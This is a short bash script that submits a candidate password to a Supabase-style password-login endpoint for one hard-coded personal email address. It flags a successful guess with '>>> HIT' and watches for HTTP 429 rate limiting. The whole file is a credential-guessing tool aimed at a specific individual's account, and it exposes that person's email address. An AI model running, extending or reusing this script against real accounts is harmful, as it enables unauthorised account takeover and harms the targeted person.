#!/bin/bash
r=$(curl -s -m 5 -w '\n%{http_code}' -X POST "$SB/auth/v1/token?grant_type=password" \
  -H "apikey: $AK" -H "Content-Type: application/json" \
  -d "{\"email\":\"jaecob30m@gmail.com\",\"password\":\"$1\"}")
c=$(printf '%s' "$r" | tail -1)
printf '%s' "$r" | grep -q access_token && echo ">>> HIT: $1"
[ "$c" = "429" ] && echo "429 at $1"
